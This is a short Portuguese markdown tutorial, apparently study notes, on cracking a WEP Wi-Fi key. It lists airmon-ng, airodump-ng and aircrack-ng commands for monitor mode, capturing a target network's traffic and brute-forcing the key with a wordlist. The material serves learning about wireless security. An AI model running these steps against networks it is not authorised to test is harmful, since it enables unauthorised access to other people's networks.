## Atacando WEP com Brute Force

#### 1° passo:

Colocar a placa em monitor mode

 ``` airmon-ng start <interface> ```

#### 2° passo:

Sniffar as redes ao redor e identificar o alvo

 ``` airodump-ng <interface> ```


#### 3° passo:

Focar o sniffing na rede alvo para capturar o trafego...

 ``` airodump-ng --bssid BSSID --channel CHANNEL <interface> -w CAPNAME ```


#### 4° passo:

Esperar alguns clientes se conectarem e usar a captura para acahr a key... 

 ``` aircrack-ng -a 1 -n 128 -w <wordlist> arquivo.cap ```
 
 

